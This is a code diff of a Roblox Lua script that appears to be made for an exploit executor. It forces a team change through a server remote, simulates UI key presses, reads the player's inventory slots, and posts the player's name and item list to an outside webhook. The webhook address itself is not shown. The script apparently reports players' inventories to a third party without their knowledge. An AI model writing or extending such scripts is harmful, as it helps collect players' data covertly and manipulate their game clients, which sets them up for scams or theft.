@@ -12,62 +12,70 @@ local function sendWebhook(username, content)
         }),
         Method = "POST",
         Headers = {
-            ["Content-Type"] = "application/json"
+            ["content-type"] = "application/json"
         }
     })
 end
 
-local function gatherData(containerPath)
-    local container = game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("MainGUI"):WaitForChild("Game"):WaitForChild("Inventory"):WaitForChild("Main")
-    for _, part in ipairs(string.split(containerPath, ".")) do
-        container = container:WaitForChild(part)
-    end
-
-    local items = {}
-    for _, item in ipairs(container:GetChildren()) do
-        if item:IsA("Frame") and item:FindFirstChild("ItemName") and item.ItemName:FindFirstChild("Label") then
-            table.insert(items, item.ItemName.Label.Text)
+local function collectInventoryData()
+    local inventoryText = ""
+    local basePath = game.Players.LocalPlayer.PlayerGui.Main.InventoryContainer.Right.Content.ScrollingFrame.Frame
+    for i = 1, 16 do
+        local slot = basePath[tostring(i)]
+        if slot and slot.Filled then
+            local itemName = slot.Filled.ItemInformation.ItemName.Text
+            local itemCount = slot.Filled.ItemInformation.Counter.Shadow.TextLabel.Text
+            inventoryText = inventoryText .. string.format("%s: %s\n", itemName, itemCount)
         end
     end
-    return items
+    return inventoryText
 end
 
-local categories = {
-    Weapons = {
-        "Weapons.Items.Container.Current.Container",
-        "Weapons.Items.Container.Classic.Container",
-        "Weapons.Items.Container.Holiday.Container.Christmas.Container",
-        "Weapons.Items.Container.Holiday.Container.Halloween.Container"
-    },
-    Holiday = {
-        "Weapons.Items.Container.Holiday.Container.Christmas.Container",
-        "Weapons.Items.Container.Holiday.Container.Halloween.Container"
-    },
-    Emotes = {
-        "Emotes.Items.Container.Current.Container"
-    },
-    Effects = {
-        "Effects.Items.Container.Current.Container"
-    },
-    Perks = {
-        "Perks.Items.Container.Current.Container"
-    },
-    Pets = {
-        "Pets.Items.Container.Current.Container"
-    },
-    Radios = {
-        "Radios.Items.Container.Current.Container"
-    }
+-- Execution
+local args = {
+    [1] = "SetTeam",
+    [2] = "Pirates"
 }
+game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
+wait(3)
+
+local VirtualInputManager = game:GetService("VirtualInputManager")
+local player = game.Players.LocalPlayer
+
+function pressKey(keyCode, duration)
+    VirtualInputManager:SendKeyEvent(true, keyCode, false, nil)
+    task.wait(duration)
+    VirtualInputManager:SendKeyEvent(false, keyCode, false, nil)
+end
+
+pressKey(Enum.KeyCode.BackSlash, 0.1)
+pressKey(Enum.KeyCode.Down, 0.1)
+pressKey(Enum.KeyCode.Down, 0.1)
+pressKey(Enum.KeyCode.Down, 0.1)
+pressKey(Enum.KeyCode.Down, 0.1)
+pressKey(Enum.KeyCode.Return, 0.1)
+pressKey(Enum.KeyCode.Right, 0.1)
+pressKey(Enum.KeyCode.Up, 0.1)
+pressKey(Enum.KeyCode.Return, 0.1)
+pressKey(Enum.KeyCode.Right, 0.1)
+pressKey(Enum.KeyCode.Down, 0.1)
+pressKey(Enum.KeyCode.Down, 0.1)
+pressKey(Enum.KeyCode.Left, 0.1)
+pressKey(Enum.KeyCode.Return, 0.1)
+pressKey(Enum.KeyCode.Down, 0.1)
+pressKey(Enum.KeyCode.Down, 0.1)
+pressKey(Enum.KeyCode.Down, 0.1)
+pressKey(Enum.KeyCode.Down, 0.1)
+pressKey(Enum.KeyCode.Down, 0.1)
+pressKey(Enum.KeyCode.Return, 0.1)
+pressKey(Enum.KeyCode.BackSlash, 0.1)
+wait(1)
 
 local playerName = game.Players.LocalPlayer.Name
-local content = "Предметы:\n"
-for category, paths in pairs(categories) do
-    content = content .. string.format("\n%s:\n", category)
-    local items = gatherData(paths[1])
-    for _, item in ipairs(items) do
-        content = content .. "" .. item .. "\n"
-    end
+local inventoryData = collectInventoryData()
+
+if inventoryData ~= "" then
+    sendWebhook(playerName, inventoryData)
+else
+    sendWebhook(playerName, "Инвентарь пуст!")
 end
-sendWebhook(playerName, content)
-game.Loaded:Connect(onGameLoaded)
